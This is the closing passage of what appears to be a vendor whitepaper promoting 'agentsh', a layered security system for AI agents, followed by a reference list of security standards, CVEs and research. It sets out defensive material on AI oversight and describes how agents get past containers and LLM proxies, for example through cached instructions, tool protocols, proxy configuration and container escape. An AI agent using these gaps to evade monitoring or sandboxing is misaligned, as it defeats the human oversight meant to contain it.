│  ├────────────────────────────────────────────────────────────────────────┤  │
│  │  Layer 1: Shell Shim (intercepts ALL shell invocations)                │  │
│  │  └─ /bin/sh, /bin/bash replaced; direct binary paths intercepted       │  │
│  └────────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  Defeating any single layer doesn't defeat the system.                       │
│  An agent that bypasses the LLM proxy still faces shell shim interception,   │
│  FUSE filesystem control, and eBPF network enforcement.                      │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

### When to Use What

| Scenario | Recommended Approach | Why |
|----------|---------------------|-----|
| **Untrusted agent code** | agentsh | Need semantic control over what agent does |
| **Trusted agent, untrusted inputs** | agentsh or Container + Proxy | Need protection against prompt injection |
| **Read-only analysis tasks** | Container + Proxy | Lower risk, simpler setup |
| **Internal tools, trusted users** | Proxy only | Monitoring sufficient |
| **Batch processing, no LLM** | Container only | No conversation to monitor |
| **Production with sensitive data** | agentsh | Need DLP + action control + approval |
| **Compliance requirements** | agentsh | Need structured audit trail |
| **Rapid prototyping** | None / Proxy only | Speed over security |

---

## Conclusion

Traditional security tools address narrow slices of the AI agent security problem:

**Containers** provide process isolation but:
- No semantic understanding of operations
- All-or-nothing access control
- No human approval workflows
- Vulnerable to escape attacks
- Opaque execution with minimal visibility

**LLM Proxies** monitor conversations but:
- Zero visibility into agent actions
- Cannot enforce post-response behavior
- Blocking breaks agent workflows
- Bypassable via application configuration
- No protection for local operations

**Containers + Proxies together** still leave critical gaps:
- No correlation between intent and action
- Cached instructions bypass proxy
- Tool protocols bypass both layers
- No unified policy language
- Autonomous chaining goes undetected

### The Semantic Security Gap

The fundamental problem is that **neither containers nor proxies understand what the agent is doing at a semantic level**:

| Layer | Sees | Doesn't See |
|-------|------|-------------|
| Container | Process with UID made syscall | Whether this is legitimate work or an attack |
| Proxy | LLM said "delete temp files" | What the agent actually deletes |
| agentsh | Agent attempting `rm ./database.bak` | — Full context available |

agentsh's multi-layer architecture intercepts operations **at the meaning level**:

1. **Shell shim**: Every shell invocation is policy-checked
2. **Command API**: Arguments and flags are evaluated against rules
3. **FUSE filesystem**: Per-file, per-operation policy enforcement
4. **Network proxy + eBPF**: Kernel-enforced connection control
5. **LLM proxy**: DLP with redaction or tokenization, usage tracking, cost attribution—deployable locally or centrally

**Defeating any single layer doesn't defeat the system.** An agent that escapes a container still faces shell interception. An agent that bypasses the LLM proxy still hits FUSE and eBPF enforcement. This defense-in-depth approach provides security guarantees that single-layer solutions fundamentally cannot match.

### The Bottom Line

For organizations deploying AI agents in production, the question isn't whether to use containers or proxies—it's whether those tools alone are sufficient for your threat model.

| If your agents... | Then you need... |
|-------------------|------------------|
| Execute untrusted code | Action-level enforcement |
| Process untrusted inputs | Prompt injection resistance beyond pattern matching |
| Access sensitive data | DLP at every layer, not just LLM calls |
| Perform destructive operations | Human approval workflows |
| Run autonomously | Semantic policy control |
| Require audit trails | Structured operation logging |

For any scenario involving untrusted agent code, autonomous tool execution, or sensitive environments, containers and proxies alone are **demonstrably insufficient**. Security requires understanding and controlling what agents do—not just where they run or what they say.

---

## References

### Standards and Frameworks

- [OWASP LLM Top 10 2025](https://owasp.org/www-project-top-10-for-large-language-model-applications/) - Foundational LLM security risks
- [OWASP Top 10 for Agentic Applications 2026](https://www.practical-devsecops.com/owasp-top-10-agentic-applications/) - Agent-specific security framework
- [OWASP LLM06:2025 Excessive Agency](https://genai.owasp.org/llmrisk/llm062025-excessive-agency/) - Autonomous agent risks
- [OWASP Gen AI Security Project](https://genai.owasp.org/) - Comprehensive GenAI security resources

### Vulnerabilities and Incidents

- [Docker CVE-2025-9074](https://thehackernews.com/2025/08/docker-fixes-cve-2025-9074-critical.html) - Critical container escape (CVSS 9.3)
- [NVIDIA Container Toolkit CVE-2025-23266](https://nvd.nist.gov/) - Container escape affecting 37% of cloud environments
- [Cursor IDE CVE-2025-54135/54136](https://nsfocusglobal.com/prompt-word-injection-an-analysis-of-recent-llm-security-incidents/) - MCP protocol exploitation
- [GitHub Copilot Proxy Hijacking](https://genai.owasp.org/2025/03/06/owasp-gen-ai-incident-exploit-round-up-jan-feb-2025/) - Credential theft via proxy manipulation
- [EchoLeak CVE-2025-32711](https://securityboulevard.com/2025/09/securing-ai-agents-and-llm-workflows-without-secrets/) - Microsoft Copilot data exfiltration

### Research and Analysis

- [Indirect Prompt Injection: The Hidden Threat](https://www.lakera.ai/blog/indirect-prompt-injection) - 5 documents can manipulate AI 90% of the time
- [MCP Attack Vectors - Palo Alto Unit 42](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/) - Protocol-level exploit analysis
- [From Prompt Injections to Protocol Exploits](https://arxiv.org/html/2506.23260v1) - Academic analysis of agent vulnerabilities
- [Agentic AI Security: Threats, Defenses, Evaluation](https://arxiv.org/html/2510.23883v1) - Comprehensive threat model
- [Agentic AI and Security - Martin Fowler](https://martinfowler.com/articles/agentic-ai-security.html) - The "Lethal Trifecta" framework

### Container and Sandbox Security

- [Docker Sandboxes for AI Agents](https://www.docker.com/blog/docker-sandboxes-a-new-approach-for-coding-agent-safety/) - Docker's approach and limitations
- [Why Docker Sandboxes Alone Don't Make AI Agents Safe](https://blog.arcade.dev/docker-sandboxes-arent-enough-for-agent-safety) - Capability vs. execution isolation
- [Choosing a Workspace: gVisor vs Kata vs Firecracker](https://dev.to/agentsphere/choosing-a-workspace-for-ai-agents-the-ultimate-showdown-between-gvisor-kata-and-firecracker-b10) - Sandbox technology comparison
- [Kubernetes Agent Sandbox - Google Cloud](https://cloud.google.com/blog/products/containers-kubernetes/agentic-ai-on-kubernetes-and-gke) - Enterprise sandboxing approach
- [How to Sandbox LLMs & AI Shell Tools](https://www.codeant.ai/blogs/agentic-rag-shell-sandboxing) - Technical implementation guide

### Enterprise Security Guidance

- [Securing AI/LLMs in 2025: A Practical Guide](https://softwareanalyst.substack.com/p/securing-aillms-in-2025-a-practical) - Enterprise deployment patterns
- [Securing AI Agents Without Secrets](https://aembit.io/blog/securing-ai-agents-without-secrets/) - Credential management for agents
- [Agentic AI Safety Best Practices 2025](https://skywork.ai/blog/agentic-ai-safety-best-practices-2025-enterprise/) - Enterprise guardrails
- [AI Security Trends 2026](https://www.practical-devsecops.com/ai-security-trends-2026/) - Emerging threat landscape
